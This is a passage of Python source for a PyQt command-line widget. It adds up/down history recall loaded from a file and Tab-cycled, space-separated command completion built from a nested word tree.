            time.sleep(1)

    def quit(self) -> None:
        self.exit = True


class CommandEditor(QLineEdit):
    tabPressed = pyqtSignal()

    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)

        self.cmdHistory: list[str] = []
        self.idx: int = 0

        if os.path.isfile(CmdHistoryFileName):
            with open(CmdHistoryFileName) as cmdHistoryFile:
                self.cmdHistory = cmdHistoryFile.readlines()
            self.idx = len(self.cmdHistory) - 1

        QShortcut(Qt.Key.Key_Up, self, self.historyUp)
        QShortcut(Qt.Key.Key_Down, self, self.historyDown)

        self.codeCompleter = CodeCompleter(completerData, self)
        # needed to clear the completer after activation
        self.codeCompleter.activated.connect(self.onActivated)
        self.setCompleter(self.codeCompleter)
        self.tabPressed.connect(self.nextCompletion)

    def nextCompletion(self):
        index = self.codeCompleter.currentIndex()
        self.codeCompleter.popup().setCurrentIndex(index)
        start = self.codeCompleter.currentRow()
        if not self.codeCompleter.setCurrentRow(start + 1):
            self.codeCompleter.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.Type.KeyPress and event.key() == Qt.Key.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def historyUp(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.idx=max(self.idx-1,0)
            self.setText(cmd.strip())

    def historyDown(self):
        if(self.idx<len(self.cmdHistory) and self.idx>=0):
            self.idx=min(self.idx+1,len(self.cmdHistory)-1)
            cmd = self.cmdHistory[self.idx%len(self.cmdHistory)]
            self.setText(cmd.strip())

    def setCmdHistory(self) -> None:
        with open(CmdHistoryFileName) as cmdHistoryFile:
            self.cmdHistory = cmdHistoryFile.readlines()
        self.idx = len(self.cmdHistory) - 1

    def clearLine(self):
        self.clear()

    def onActivated(self):
        QTimer.singleShot(0, self.clear)


class CodeCompleter(QCompleter):
    ConcatenationRole = Qt.ItemDataRole.UserRole + 1

    def __init__(self, data, parent=None):
        super().__init__(parent)
        self.createModel(data)

    def splitPath(self, path):
        return path.split(' ')

    def pathFromIndex(self, ix):
        return ix.data(CodeCompleter.ConcatenationRole)

    def createModel(self, data):
        def addItems(parent, elements, t=""):
            for text, children in elements:
                item = QStandardItem(text)
                data = t + " " + text if t else text
                item.setData(data, CodeCompleter.ConcatenationRole)
                parent.appendRow(item)
                if children:
                    addItems(item, children, data)
        model = QStandardItemModel(self)
        addItems(model, data)
        self.setModel(model)
